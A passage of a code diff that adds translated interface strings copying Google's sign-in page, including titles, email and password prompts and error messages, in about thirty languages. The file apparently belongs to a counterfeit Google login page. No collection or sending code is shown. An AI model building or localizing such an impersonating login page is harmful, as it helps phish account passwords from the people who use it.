+                submitErr: 'Jotakin meni pieleen. Yritä uudelleen.',
+                networkErr: 'Tarkista verkkoyhteys ja yritä uudelleen.'
+            },
+            sv: {
+                pageTitle: 'Logga in – Google-konton',
+                s1Title: 'Logga in',
+                s1Subtitle: 'Använd ditt Google-konto',
+                emailLabel: 'E-postadress eller telefonnummer',
+                emailErr: 'Ange en e-postadress eller ett telefonnummer',
+                forgotEmail: 'Har du glömt e-postadressen?',
+                guestText: 'Är det inte din dator? Använd gästläget för att logga in privat.',
+                guestLearnMore: 'Läs mer om hur du använder gästläget',
+                createAccount: 'Skapa konto',
+                next: 'Nästa',
+                s2Title: 'Välkommen',
+                pwLabel: 'Ange ditt lösenord',
+                pwErr: 'Ange ett lösenord',
+                showPw: 'Visa lösenord',
+                forgotPw: 'Har du glömt lösenordet?',
+                help: 'Hjälp',
+                privacy: 'Integritet',
+                terms: 'Villkor',
+                submitErr: 'Något gick fel. Försök igen.',
+                networkErr: 'Kontrollera nätverksanslutningen och försök igen.'
+            },
+            vi: {
+                pageTitle: 'Đăng nhập - Tài khoản Google',
+                s1Title: 'Đăng nhập',
+                s1Subtitle: 'Sử dụng Tài khoản Google của bạn',
+                emailLabel: 'Email hoặc số điện thoại',
+                emailErr: 'Nhập email hoặc số điện thoại',
+                forgotEmail: 'Bạn quên địa chỉ email?',
+                guestText: 'Đây không phải máy tính của bạn? Hãy sử dụng chế độ Khách để đăng nhập một cách riêng tư.',
+                guestLearnMore: 'Tìm hiểu thêm về cách sử dụng chế độ Khách',
+                createAccount: 'Tạo tài khoản',
+                next: 'Tiếp theo',
+                s2Title: 'Chào mừng',
+                pwLabel: 'Nhập mật khẩu của bạn',
+                pwErr: 'Nhập mật khẩu',
+                showPw: 'Hiện mật khẩu',
+                forgotPw: 'Bạn quên mật khẩu?',
+                help: 'Trợ giúp',
+                privacy: 'Quyền riêng tư',
+                terms: 'Điều khoản',
+                submitErr: 'Đã xảy ra sự cố. Vui lòng thử lại.',
+                networkErr: 'Vui lòng kiểm tra kết nối mạng và thử lại.'
+            },
+            tr: {
+                pageTitle: 'Oturum açın - Google Hesapları',
+                s1Title: 'Oturum açın',
+                s1Subtitle: 'Google Hesabınızı kullanın',
+                emailLabel: 'E-posta veya telefon',
+                emailErr: 'Bir e-posta adresi veya telefon numarası girin',
+                forgotEmail: 'E-posta adresinizi mi unuttunuz?',
+                guestText: 'Bu sizin bilgisayarınız değil mi? Gizli oturum açmak için Misafir modunu kullanın.',
+                guestLearnMore: 'Misafir modunu kullanma hakkında daha fazla bilgi edinin',
+                createAccount: 'Hesap oluşturun',
+                next: 'İleri',
+                s2Title: 'Hoş geldiniz',
+                pwLabel: 'Şifrenizi girin',
+                pwErr: 'Bir şifre girin',
+                showPw: 'Şifreyi göster',
+                forgotPw: 'Şifrenizi mi unuttunuz?',
+                help: 'Yardım',
+                privacy: 'Gizlilik',
+                terms: 'Şartlar',
+                submitErr: 'Bir sorun oluştu. Lütfen tekrar deneyin.',
+                networkErr: 'Lütfen ağ bağlantınızı kontrol edip tekrar deneyin.'
+            },
+            el: {
+                pageTitle: 'Σύνδεση - Λογαριασμοί Google',
+                s1Title: 'Σύνδεση',
+                s1Subtitle: 'Χρησιμοποιήστε τον Λογαριασμό σας Google',
+                emailLabel: 'Διεύθυνση ηλεκτρονικού ταχυδρομείου ή τηλέφωνο',
+                emailErr: 'Εισαγάγετε μια διεύθυνση ηλεκτρονικού ταχυδρομείου ή έναν αριθμό τηλεφώνου',
+                forgotEmail: 'Ξεχάσατε το email;',
+                guestText: 'Δεν είναι ο υπολογιστής σας; Χρησιμοποιήστε τη λειτουργία επισκέπτη για ιδιωτική σύνδεση.',
+                guestLearnMore: 'Μάθετε περισσότερα σχετικά με τη χρήση της λειτουργίας επισκέπτη',
+                createAccount: 'Δημιουργία λογαριασμού',
+                next: 'Επόμενο',
+                s2Title: 'Καλώς ορίσατε',
+                pwLabel: 'Εισαγάγετε τον κωδικό πρόσβασής σας',
+                pwErr: 'Εισαγάγετε έναν κωδικό πρόσβασης',
+                showPw: 'Εμφάνιση κωδικού πρόσβασης',
+                forgotPw: 'Ξεχάσατε τον κωδικό πρόσβασης;',
+                help: 'Βοήθεια',
+                privacy: 'Απόρρητο',
+                terms: 'Όροι',
+                submitErr: 'Παρουσιάστηκε πρόβλημα. Δοκιμάστε ξανά.',
+                networkErr: 'Ελέγξτε τη σύνδεσή σας στο δίκτυο και δοκιμάστε ξανά.'
+            },
+            be: {
+                pageTitle: 'Уваход – Уліковыя запісы Google',
+                s1Title: 'Уваход',
+                s1Subtitle: 'Выкарыстоўвайце свой уліковы запіс Google',
+                emailLabel: 'Адрас электроннай пошты або тэлефон',
+                emailErr: 'Увядзіце адрас электроннай пошты або нумар тэлефона',
+                forgotEmail: 'Забылі адрас электроннай пошты?',
+                guestText: 'Не ваш камп’ютар? Выкарыстоўвайце гасцявы рэжым, каб увайсці прыватна.',
+                guestLearnMore: 'Даведайцеся больш пра выкарыстанне гасцявога рэжыму',
+                createAccount: 'Стварыць уліковы запіс',
+                next: 'Далей',
+                s2Title: 'Вітаем!',
+                pwLabel: 'Увядзіце пароль',
+                pwErr: 'Увядзіце пароль',
+                showPw: 'Паказаць пароль',
+                forgotPw: 'Забылі пароль?',
+                help: 'Даведка',
+                privacy: 'Прыватнасць',
+                terms: 'Умовы',
+                submitErr: 'Адбылася памылка. Паўтарыце спробу.',
+                networkErr: 'Праверце падключэнне да сеткі і паўтарыце спробу.'
+            },
+            bg: {
+                pageTitle: 'Вход – профили в Google',
+                s1Title: 'Вход',
+                s1Subtitle: 'Използвайте профила си в Google',
+                emailLabel: 'Имейл адрес или телефон',
+                emailErr: 'Въведете имейл адрес или телефонен номер',
+                forgotEmail: 'Забравихте имейл адреса?',
+                guestText: 'Компютърът не е ваш? Използвайте режима на гост, за да влезете поверително.',
+                guestLearnMore: 'Научете повече за използването на режима на гост',
+                createAccount: 'Създаване на профил',
+                next: 'Напред',
+                s2Title: 'Добре дошли',
+                pwLabel: 'Въведете паролата си',
+                pwErr: 'Въведете парола',
+                showPw: 'Показване на паролата',
+                forgotPw: 'Забравена парола?',
+                help: 'Помощ',
+                privacy: 'Поверителност',
+                terms: 'Условия',
+                submitErr: 'Възникна проблем. Моля, опитайте отново.',
+                networkErr: 'Моля, проверете мрежовата си връзка и опитайте отново.'
+            },
+            ky: {
+                pageTitle: 'Кирүү - Google аккаунттары',
+                s1Title: 'Кирүү',
+                s1Subtitle: 'Google аккаунтуңузду колдонуңуз',
+                emailLabel: 'Электрондук почта же телефон',
+                emailErr: 'Электрондук почта дарегин же телефон номерин киргизиңиз',
+                forgotEmail: 'Электрондук почтаңызды унуттуңузбу?',
+                guestText: 'Сиздин компьютериңиз эмеспи? Купуя кирүү үчүн Конок режимин колдонуңуз.',
+                guestLearnMore: 'Конок режимин колдонуу тууралуу кеңири маалымат',
+                createAccount: 'Аккаунт түзүү',
+                next: 'Кийинки',
+                s2Title: 'Кош келиңиз',
+                pwLabel: 'Сырсөзүңүздү киргизиңиз',
+                pwErr: 'Сырсөз киргизиңиз',
+                showPw: 'Сырсөздү көрсөтүү',
+                forgotPw: 'Сырсөздү унуттуңузбу?',
+                help: 'Жардам',
+                privacy: 'Купуялык',
+                terms: 'Шарттар',
+                submitErr: 'Ката кетти. Кайра аракет кылып көрүңүз.',
+                networkErr: 'Тармак байланышын текшерип, кайра аракет кылыңыз.'
+            },
+            kk: {
+                pageTitle: 'Кіру – Google аккаунттары',
+                s1Title: 'Кіру',
+                s1Subtitle: 'Google аккаунтыңызды пайдаланыңыз',
+                emailLabel: 'Электрондық пошта немесе телефон',
+                emailErr: 'Электрондық пошта мекенжайын немесе телефон нөмірін енгізіңіз',
+                forgotEmail: 'Электрондық поштаны ұмыттыңыз ба?',
+                guestText: 'Бұл сіздің компьютеріңіз емес пе? Құпия кіру үшін Қонақ режимін пайдаланыңыз.',
+                guestLearnMore: 'Қонақ режимін пайдалану туралы толығырақ',
+                createAccount: 'Аккаунт жасау',
+                next: 'Келесі',
+                s2Title: 'Қош келдіңіз',
+                pwLabel: 'Құпия сөзіңізді енгізіңіз',
+                pwErr: 'Құпия сөзді енгізіңіз',
+                showPw: 'Құпия сөзді көрсету',
+                forgotPw: 'Құпия сөзді ұмыттыңыз ба?',
+                help: 'Анықтама',
+                privacy: 'Құпиялық',
+                terms: 'Шарттар',
+                submitErr: 'Бірдеңе дұрыс болмады. Қайталап көріңіз.',
+                networkErr: 'Желі қосылымын тексеріп, қайталап көріңіз.'
+            },
+            mk: {
+                pageTitle: 'Најавете се - сметки на Google',
+                s1Title: 'Најавете се',
+                s1Subtitle: 'Користете ја вашата сметка на Google',
+                emailLabel: 'Е-пошта или телефон',
+                emailErr: 'Внесете е-пошта или телефонски број',
+                forgotEmail: 'Ја заборавивте е-поштата?',
+                guestText: 'Не е ваш компјутер? Користете режим на гостин за приватно најавување.',
+                guestLearnMore: 'Дознајте повеќе за користење на режимот на гостин',
+                createAccount: 'Создајте сметка',
+                next: 'Следно',
+                s2Title: 'Добре дојдовте',
+                pwLabel: 'Внесете ја вашата лозинка',
+                pwErr: 'Внесете лозинка',
+                showPw: 'Прикажи лозинка',
+                forgotPw: 'Ја заборавивте лозинката?',
+                help: 'Помош',
+                privacy: 'Приватност',
+                terms: 'Услови',
+                submitErr: 'Нешто тргна наопаку. Обидете се повторно.',
+                networkErr: 'Проверете ја мрежната врска и обидете се повторно.'
+            },
+            mn: {
+                pageTitle: 'Нэвтрэх - Google Бүртгэлүүд',
+                s1Title: 'Нэвтрэх',
+                s1Subtitle: 'Өөрийн Google Бүртгэлийг ашиглах',
+                emailLabel: 'Имэйл эсвэл утас',
+                emailErr: 'Имэйл эсвэл утасны дугаар оруулна уу',
+                forgotEmail: 'Имэйлээ мартсан уу?',
+                guestText: 'Таны компьютер биш үү? Нууцаар нэвтрэхийн тулд Зочны горимыг ашиглана уу.',
+                guestLearnMore: 'Зочны горим ашиглах талаар нэмэлт мэдээлэл авах',
+                createAccount: 'Бүртгэл үүсгэх',
+                next: 'Дараах',
+                s2Title: 'Тавтай морил',
+                pwLabel: 'Нууц үгээ оруулна уу',
+                pwErr: 'Нууц үг оруулна уу',
+                showPw: 'Нууц үгийг харуулах',
+                forgotPw: 'Нууц үгээ мартсан уу?',
+                help: 'Тусламж',
+                privacy: 'Нууцлал',
+                terms: 'Нөхцөл',
+                submitErr: 'Алдаа гарлаа. Дахин оролдоно уу.',
+                networkErr: 'Сүлжээний холболтоо шалгаад дахин оролдоно уу.'
+            },
+            ru: {
+                pageTitle: 'Вход – Google Аккаунты',
+                s1Title: 'Вход',
+                s1Subtitle: 'Используйте аккаунт Google',
+                emailLabel: 'Телефон или адрес эл. почты',
+                emailErr: 'Введите адрес электронной почты или номер телефона',
+                forgotEmail: 'Забыли адрес электронной почты?',
+                guestText: 'Работаете на чужом компьютере? Включите гостевой режим.',
+                guestLearnMore: 'Подробнее о гостевом режиме',
+                createAccount: 'Создать аккаунт',
+                next: 'Далее',
+                s2Title: 'Добро пожаловать!',
+                pwLabel: 'Введите пароль',
+                pwErr: 'Введите пароль',
+                showPw: 'Показать пароль',
+                forgotPw: 'Забыли пароль?',
+                help: 'Справка',
+                privacy: 'Конфиденциальность',
+                terms: 'Условия',
+                submitErr: 'Произошла ошибка. Повторите попытку.',
+                networkErr: 'Проверьте подключение к сети и повторите попытку.'
+            },
+            sr: {
+                pageTitle: 'Пријављивање – Google налози',
+                s1Title: 'Пријављивање',
+                s1Subtitle: 'Користите Google налог',
+                emailLabel: 'Имејл или телефон',
+                emailErr: 'Унесите имејл или број телефона',
+                forgotEmail: 'Заборавили сте имејл?',
+                guestText: 'Није ваш рачунар? Користите режим госта да бисте се приватно пријавили.',
+                guestLearnMore: 'Сазнајте више о коришћењу режима госта',
+                createAccount: 'Направи налог',
+                next: 'Даље',
+                s2Title: 'Добро дошли',
+                pwLabel: 'Унесите лозинку',
+                pwErr: 'Унесите лозинку',
+                showPw: 'Прикажи лозинку',
+                forgotPw: 'Заборавили сте лозинку?',
+                help: 'Помоћ',
+                privacy: 'Приватност',
+                terms: 'Услови',
+                submitErr: 'Дошло је до грешке. Пробајте поново.',
+                networkErr: 'Проверите мрежну везу и пробајте поново.'
+            },
+            uk: {
+                pageTitle: 'Вхід – Облікові записи Google',
+                s1Title: 'Вхід',
+                s1Subtitle: 'Використовуйте обліковий запис Google',
+                emailLabel: 'Електронна адреса або телефон',
+                emailErr: 'Введіть електронну адресу або номер телефону',
+                forgotEmail: 'Забули електронну адресу?',
+                guestText: 'Не ваш комп’ютер? Використовуйте гостьовий режим, щоб увійти приватно.',
+                guestLearnMore: 'Докладніше про гостьовий режим',
+                createAccount: 'Створити обліковий запис',
+                next: 'Далі',
+                s2Title: 'Вітаємо!',
+                pwLabel: 'Введіть пароль',
+                pwErr: 'Введіть пароль',
+                showPw: 'Показати пароль',
+                forgotPw: 'Забули пароль?',
+                help: 'Довідка',
+                privacy: 'Конфіденційність',
+                terms: 'Умови',
+                submitErr: 'Сталася помилка. Повторіть спробу.',
+                networkErr: 'Перевірте підключення до мережі та повторіть спробу.'
+            },
+            ka: {
+                pageTitle: 'შესვლა - Google ანგარიშები',
+                s1Title: 'შესვლა',
+                s1Subtitle: 'გამოიყენეთ თქვენი Google ანგარიში',
+                emailLabel: 'ელფოსტა ან ტელეფონი',
+                emailErr: 'შეიყვანეთ ელფოსტა ან ტელეფონის ნომერი',
+                forgotEmail: 'დაგავიწყდათ ელფოსტა?',
+                guestText: 'ეს თქვენი კომპიუტერი არ არის? კონფიდენციალურად შესასვლელად გამოიყენეთ სტუმრის რეჟიმი.',
+                guestLearnMore: 'შეიტყვეთ მეტი სტუმრის რეჟიმის გამოყენების შესახებ',
+                createAccount: 'ანგარიშის შექმნა',
+                next: 'შემდეგი',
+                s2Title: 'მოგესალმებით',
+                pwLabel: 'შეიყვანეთ თქვენი პაროლი',
+                pwErr: 'შეიყვანეთ პაროლი',
+                showPw: 'პაროლის ჩვენება',
+                forgotPw: 'დაგავიწყდათ პაროლი?',
+                help: 'დახმარება',
+                privacy: 'კონფიდენციალურობა',
+                terms: 'პირობები',
+                submitErr: 'დაფიქსირდა შეცდომა. გთხოვთ, სცადოთ ხელახლა.',
+                networkErr: 'შეამოწმეთ ქსელთან კავშირი და სცადეთ ხელახლა.'
+            },
+            hy: {
+                pageTitle: 'Մուտք - Google Հաշիվներ',
+                s1Title: 'Մուտք',
+                s1Subtitle: 'Օգտագործեք ձեր Google Հաշիվը',
+                emailLabel: 'Էլ․ հասցե կամ հեռախոսահամար',
+                emailErr: 'Մուտքագրեք էլ․ հասցե կամ հեռախոսահամար',
+                forgotEmail: 'Մոռացե՞լ եք էլ․ հասցեն',
+                guestText: 'Ձեր համակարգիչը չէ՞։ Գաղտնի մուտք գործելու համար օգտագործեք Հյուրի ռեժիմը։',
+                guestLearnMore: 'Իմանալ ավելին Հյուրի ռեժիմն օգտագործելու մասին',
+                createAccount: 'Ստեղծել հաշիվ',
+                next: 'Առաջ',
+                s2Title: 'Բարի գալուստ',
+                pwLabel: 'Մուտքագրեք ձեր գաղտնաբառը',
+                pwErr: 'Մուտքագրեք գաղտնաբառը',
+                showPw: 'Ցուցադրել գաղտնաբառը',
+                forgotPw: 'Մոռացե՞լ եք գաղտնաբառը',
+                help: 'Օգնություն',
+                privacy: 'Գաղտնիություն',
+                terms: 'Պայմաններ',
+                submitErr: 'Ինչ-որ բան այնպես չգնաց։ Կրկին փորձեք։',
+                networkErr: 'Ստուգեք ցանցային կապը և կրկին փորձեք։'
+            },
+            he: {
+                pageTitle: 'כניסה – חשבונות Google',
+                s1Title: 'כניסה',
+                s1Subtitle: 'באמצעות חשבון Google שלך',
+                emailLabel: 'אימייל או טלפון',
+                emailErr: 'יש להזין אימייל או מספר טלפון',
+                forgotEmail: 'שכחת את כתובת האימייל?',
+                guestText: 'המחשב הזה לא שלך? אפשר להיכנס לחשבון באופן פרטי באמצעות מצב אורח.',
+                guestLearnMore: 'מידע נוסף על השימוש במצב אורח',
+                createAccount: 'יצירת חשבון',
+                next: 'הבא',
+                s2Title: 'שלום',
+                pwLabel: 'יש להזין את הסיסמה',
+                pwErr: 'יש להזין סיסמה',
+                showPw: 'הצגת הסיסמה',
+                forgotPw: 'שכחת את הסיסמה?',
+                help: 'עזרה',
+                privacy: 'פרטיות',
+                terms: 'תנאים',
+                submitErr: 'אירעה שגיאה. יש לנסות שוב.',
+                networkErr: 'יש לבדוק את החיבור לרשת ולנסות שוב.'
+            },
+            ur: {
+                pageTitle: 'سائن ان کریں - Google اکاؤنٹس',
+                s1Title: 'سائن ان کریں',
+                s1Subtitle: 'اپنا Google اکاؤنٹ استعمال کریں',
+                emailLabel: 'ای میل یا فون',
+                emailErr: 'ای میل یا فون نمبر درج کریں',
+                forgotEmail: 'ای میل بھول گئے؟',
+                guestText: 'آپ کا کمپیوٹر نہیں ہے؟ نجی طور پر سائن ان کرنے کے لیے مہمان موڈ استعمال کریں۔',
+                guestLearnMore: 'مہمان موڈ استعمال کرنے کے بارے میں مزید جانیں',
+                createAccount: 'اکاؤنٹ بنائیں',
+                next: 'آگے',
+                s2Title: 'خوش آمدید',
+                pwLabel: 'اپنا پاس ورڈ درج کریں',
+                pwErr: 'پاس ورڈ درج کریں',
+                showPw: 'پاس ورڈ دکھائیں',
+                forgotPw: 'پاس ورڈ بھول گئے؟',
+                help: 'مدد',
+                privacy: 'رازداری',
+                terms: 'شرائط',
+                submitErr: 'کچھ غلط ہو گیا۔ براہ کرم دوبارہ کوشش کریں۔',
+                networkErr: 'براہ کرم اپنا نیٹ ورک کنکشن چیک کریں اور دوبارہ کوشش کریں۔'
+            },
+            ar: {
+                pageTitle: 'تسجيل الدخول - حسابات Google',
+                s1Title: 'تسجيل الدخول',
+                s1Subtitle: 'استخدام حسابك على Google',
+                emailLabel: 'البريد الإلكتروني أو الهاتف',
+                emailErr: 'يُرجى إدخال بريد إلكتروني أو رقم هاتف',
+                forgotEmail: 'هل نسيت البريد الإلكتروني؟',
+                guestText: 'أليس هذا جهاز الكمبيوتر الخاص بك؟ يمكنك استخدام وضع الضيف لتسجيل الدخول بشكل خاص.',
+                guestLearnMore: 'مزيد من المعلومات حول استخدام وضع الضيف',
+                createAccount: 'إنشاء حساب',
+                next: 'التالي',
+                s2Title: 'مرحبًا',
+                pwLabel: 'أدخِل كلمة المرور',
+                pwErr: 'يُرجى إدخال كلمة مرور',
+                showPw: 'إظهار كلمة المرور',
+                forgotPw: 'هل نسيت كلمة المرور؟',
+                help: 'مساعدة',
+                privacy: 'الخصوصية',
+                terms: 'البنود',
+                submitErr: 'حدث خطأ ما. يُرجى إعادة المحاولة.',
+                networkErr: 'يُرجى التحقق من اتصالك بالشبكة وإعادة المحاولة.'
+            },
+            fa: {
+                pageTitle: 'ورود به سیستم - حساب‌های Google',
+                s1Title: 'ورود به سیستم',
+                s1Subtitle: 'از «حساب Google» خودتان استفاده کنید',
+                emailLabel: 'ایمیل یا تلفن',
+                emailErr: 'ایمیل یا شماره تلفن وارد کنید',
+                forgotEmail: 'ایمیلتان را فراموش کرده‌اید؟',
+                guestText: 'این رایانه شما نیست؟ برای ورود خصوصی از حالت مهمان استفاده کنید.',
+                guestLearnMore: 'بیشتر درباره استفاده از حالت مهمان بدانید',
+                createAccount: 'ایجاد حساب',
+                next: 'بعدی',
+                s2Title: 'خوش آمدید',
+                pwLabel: 'گذرواژه‌تان را وارد کنید',
+                pwErr: 'گذرواژه را وارد کنید',
+                showPw: 'نمایش گذرواژه',
+                forgotPw: 'گذرواژه را فراموش کرده‌اید؟',
+                help: 'راهنما',
+                privacy: 'حریم خصوصی',
+                terms: 'شرایط',
+                submitErr: 'مشکلی پیش آمد. لطفاً دوباره امتحان کنید.',
+                networkErr: 'لطفاً اتصال شبکه خود را بررسی کنید و دوباره امتحان کنید.'
+            },
+            am: {
+                pageTitle: 'ይግቡ - Google መለያዎች',
+                s1Title: 'ይግቡ',
+                s1Subtitle: 'የእርስዎን Google መለያ ይጠቀሙ',
+                emailLabel: 'ኢሜይል ወይም ስልክ',
+                emailErr: 'ኢሜይል ወይም ስልክ ቁጥር ያስገቡ',
+                forgotEmail: 'ኢሜይል ረሱ?',
+                guestText: 'የእርስዎ ኮምፒውተር አይደለም? በግል ለመግባት የእንግዳ ሁነታን ይጠቀሙ።',
+                guestLearnMore: 'የእንግዳ ሁነታን ስለመጠቀም የበለጠ ይወቁ',
+                createAccount: 'መለያ ፍጠር',
+                next: 'ቀጣይ',
+                s2Title: 'እንኳን ደህና መጡ',
+                pwLabel: 'የይለፍ ቃልዎን ያስገቡ',
+                pwErr: 'የይለፍ ቃል ያስገቡ',
+                showPw: 'የይለፍ ቃል አሳይ',
+                forgotPw: 'የይለፍ ቃል ረሱ?',
+                help: 'እገዛ',
+                privacy: 'ግላዊነት',
+                terms: 'ውሎች',
+                submitErr: 'የሆነ ችግር ተፈጥሯል። እባክዎ እንደገና ይሞክሩ።',
+                networkErr: 'እባክዎ የአውታረ መረብ ግንኙነትዎን ያረጋግጡና እንደገና ይሞክሩ።'
+            },
+            ne: {
+                pageTitle: 'साइन इन गर्नुहोस् - Google खाताहरू',
+                s1Title: 'साइन इन गर्नुहोस्',
+                s1Subtitle: 'आफ्नो Google खाता प्रयोग गर्नुहोस्',
+                emailLabel: 'इमेल वा फोन',
+                emailErr: 'इमेल वा फोन नम्बर प्रविष्ट गर्नुहोस्',
+                forgotEmail: 'इमेल बिर्सनुभयो?',
+                guestText: 'तपाईंको कम्प्युटर होइन? निजी रूपमा साइन इन गर्न अतिथि मोड प्रयोग गर्नुहोस्।',
+                guestLearnMore: 'अतिथि मोड प्रयोग गर्ने बारे थप जान्नुहोस्',
+                createAccount: 'खाता सिर्जना गर्नुहोस्',
+                next: 'अर्को',
+                s2Title: 'स्वागत छ',
+                pwLabel: 'आफ्नो पासवर्ड प्रविष्ट गर्नुहोस्',
+                pwErr: 'पासवर्ड प्रविष्ट गर्नुहोस्',
+                showPw: 'पासवर्ड देखाउनुहोस्',
+                forgotPw: 'पासवर्ड बिर्सनुभयो?',
+                help: 'मद्दत',
+                privacy: 'गोपनीयता',
+                terms: 'सर्तहरू',
+                submitErr: 'केही गलत भयो। कृपया फेरि प्रयास गर्नुहोस्।',
+                networkErr: 'कृपया आफ्नो नेटवर्क जडान जाँच गर्नुहोस् र फेरि प्रयास गर्नुहोस्।'
+            },
+            mr: {
+                pageTitle: 'साइन इन करा - Google खाती',
+                s1Title: 'साइन इन करा',
+                s1Subtitle: 'तुमचे Google खाते वापरा',
+                emailLabel: 'ईमेल किंवा फोन',
+                emailErr: 'ईमेल किंवा फोन नंबर एंटर करा',
+                forgotEmail: 'ईमेल विसरलात?',
+                guestText: 'तुमचा संगणक नाही का? खाजगीरीत्या साइन इन करण्यासाठी अतिथी मोड वापरा.',
+                guestLearnMore: 'अतिथी मोड वापरण्याबद्दल अधिक जाणून घ्या',
+                createAccount: 'खाते तयार करा',
+                next: 'पुढे',
+                s2Title: 'स्वागत आहे',
+                pwLabel: 'तुमचा पासवर्ड एंटर करा',
+                pwErr: 'पासवर्ड एंटर करा',
+                showPw: 'पासवर्ड दाखवा',
+                forgotPw: 'पासवर्ड विसरलात?',
+                help: 'मदत',
+                privacy: 'गोपनीयता',
+                terms: 'अटी',
+                submitErr: 'काहीतरी चूक झाली. कृपया पुन्हा प्रयत्न करा.',
+                networkErr: 'कृपया तुमचे नेटवर्क कनेक्शन तपासा आणि पुन्हा प्रयत्न करा.'
+            },
+            hi: {
+                pageTitle: 'साइन इन करें - Google खाते',
+                s1Title: 'साइन इन करें',
+                s1Subtitle: 'अपने Google खाते का उपयोग करें',
+                emailLabel: 'ईमेल या फ़ोन',
+                emailErr: 'ईमेल या फ़ोन नंबर डालें',
+                forgotEmail: 'ईमेल भूल गए?',
+                guestText: 'क्या यह आपका कंप्यूटर नहीं है? निजी रूप से साइन इन करने के लिए अतिथि मोड का उपयोग करें.',
+                guestLearnMore: 'अतिथि मोड का उपयोग करने के बारे में अधिक जानें',
+                createAccount: 'खाता बनाएं',
+                next: 'आगे बढ़ें',
+                s2Title: 'आपका स्वागत है',
+                pwLabel: 'अपना पासवर्ड डालें',
+                pwErr: 'पासवर्ड डालें',
+                showPw: 'पासवर्ड दिखाएं',
+                forgotPw: 'पासवर्ड भूल गए?',
+                help: 'सहायता',
+                privacy: 'निजता',
+                terms: 'शर्तें',
+                submitErr: 'कोई समस्या हुई. कृपया फिर से प्रयास करें.',
+                networkErr: 'कृपया अपना नेटवर्क कनेक्शन जांचें और फिर से प्रयास करें.'
+            },
+            bn: {
+                pageTitle: 'সাইন-ইন করুন - Google অ্যাকাউন্ট',
+                s1Title: 'সাইন-ইন করুন',
+                s1Subtitle: 'আপনার Google অ্যাকাউন্ট ব্যবহার করুন',
+                emailLabel: 'ইমেল বা ফোন',
+                emailErr: 'একটি ইমেল বা ফোন নম্বর লিখুন',
+                forgotEmail: 'ইমেল ভুলে গেছেন?',
+                guestText: 'আপনার কম্পিউটার নয়? ব্যক্তিগতভাবে সাইন-ইন করতে গেস্ট মোড ব্যবহার করুন।',
+                guestLearnMore: 'গেস্ট মোড ব্যবহার করার বিষয়ে আরও জানুন',
+                createAccount: 'অ্যাকাউন্ট তৈরি করুন',
+                next: 'পরবর্তী',
+                s2Title: 'স্বাগতম',
+                pwLabel: 'আপনার পাসওয়ার্ড লিখুন',
+                pwErr: 'একটি পাসওয়ার্ড লিখুন',
+                showPw: 'পাসওয়ার্ড দেখান',
+                forgotPw: 'পাসওয়ার্ড ভুলে গেছেন?',
+                help: 'সহায়তা',
+                privacy: 'গোপনীয়তা',
+                terms: 'শর্তাবলী',
+                submitErr: 'কিছু একটা সমস্যা হয়েছে। অনুগ্রহ করে আবার চেষ্টা করুন।',
+                networkErr: 'আপনার নেটওয়ার্ক কানেকশন চেক করুন এবং আবার চেষ্টা করুন।'
+            },
+            pa: {
+                pageTitle: 'ਸਾਈਨ ਇਨ ਕਰੋ - Google ਖਾਤੇ',
+                s1Title: 'ਸਾਈਨ ਇਨ ਕਰੋ',
+                s1Subtitle: 'ਆਪਣਾ Google ਖਾਤਾ ਵਰਤੋ',
+                emailLabel: 'ਈਮੇਲ ਜਾਂ ਫ਼ੋਨ',
+                emailErr: 'ਕੋਈ ਈਮੇਲ ਜਾਂ ਫ਼ੋਨ ਨੰਬਰ ਦਾਖਲ ਕਰੋ',
+                forgotEmail: 'ਈਮੇਲ ਭੁੱਲ ਗਏ ਹੋ?',
+                guestText: 'ਕੀ ਇਹ ਤੁਹਾਡਾ ਕੰਪਿਊਟਰ ਨਹੀਂ ਹੈ? ਨਿੱਜੀ ਤੌਰ ’ਤੇ ਸਾਈਨ ਇਨ ਕਰਨ ਲਈ ਮਹਿਮਾਨ ਮੋਡ ਵਰਤੋ।',
+                guestLearnMore: 'ਮਹਿਮਾਨ ਮੋਡ ਵਰਤਣ ਬਾਰੇ ਹੋਰ ਜਾਣੋ',
+                createAccount: 'ਖਾਤਾ ਬਣਾਓ',
+                next: 'ਅੱਗੇ',
+                s2Title: 'ਜੀ ਆਇਆਂ ਨੂੰ',
+                pwLabel: 'ਆਪਣਾ ਪਾਸਵਰਡ ਦਾਖਲ ਕਰੋ',
+                pwErr: 'ਕੋਈ ਪਾਸਵਰਡ ਦਾਖਲ ਕਰੋ',
+                showPw: 'ਪਾਸਵਰਡ ਦਿਖਾਓ',
+                forgotPw: 'ਪਾਸਵਰਡ ਭੁੱਲ ਗਏ ਹੋ?',
+                help: 'ਮਦਦ',
+                privacy: 'ਪਰਦੇਦਾਰੀ',
+                terms: 'ਨਿਯਮ',
+                submitErr: 'ਕੁਝ ਗਲਤ ਹੋ ਗਿਆ। ਕਿਰਪਾ ਕਰਕੇ ਦੁਬਾਰਾ ਕੋਸ਼ਿਸ਼ ਕਰੋ।',
+                networkErr: 'ਕਿਰਪਾ ਕਰਕੇ ਆਪਣੇ ਨੈੱਟਵਰਕ ਕਨੈਕਸ਼ਨ ਦੀ ਜਾਂਚ ਕਰੋ ਅਤੇ ਦੁਬਾਰਾ ਕੋਸ਼ਿਸ਼ ਕਰੋ।'
+            },
+            gu: {
+                pageTitle: 'સાઇન ઇન કરો - Google એકાઉન્ટ',
+                s1Title: 'સાઇન ઇન કરો',
+                s1Subtitle: 'તમારું Google એકાઉન્ટ વાપરો',
+                emailLabel: 'ઇમેઇલ અથવા ફોન',
+                emailErr: 'ઇમેઇલ અથવા ફોન નંબર દાખલ કરો',
+                forgotEmail: 'ઇમેઇલ ભૂલી ગયા છો?',
+                guestText: 'તમારું કમ્પ્યુટર નથી? ખાનગી રીતે સાઇન ઇન કરવા માટે અતિથિ મોડનો ઉપયોગ કરો.',
+                guestLearnMore: 'અતિથિ મોડનો ઉપયોગ કરવા વિશે વધુ જાણો',
+                createAccount: 'એકાઉન્ટ બનાવો',
+                next: 'આગળ',
+                s2Title: 'સ્વાગત છે',
+                pwLabel: 'તમારો પાસવર્ડ દાખલ કરો',
+                pwErr: 'પાસવર્ડ દાખલ કરો',
+                showPw: 'પાસવર્ડ બતાવો',
+                forgotPw: 'પાસવર્ડ ભૂલી ગયા છો?',
+                help: 'મદદ',
+                privacy: 'પ્રાઇવસી',
+                terms: 'શરતો',
+                submitErr: 'કંઈક ખોટું થયું. કૃપા કરીને ફરી પ્રયાસ કરો.',
+                networkErr: 'કૃપા કરીને તમારું નેટવર્ક કનેક્શન તપાસો અને ફરી પ્રયાસ કરો.'
+            },
+            ta: {
+                pageTitle: 'உள்நுழைக - Google கணக்குகள்',
+                s1Title: 'உள்நுழைக',
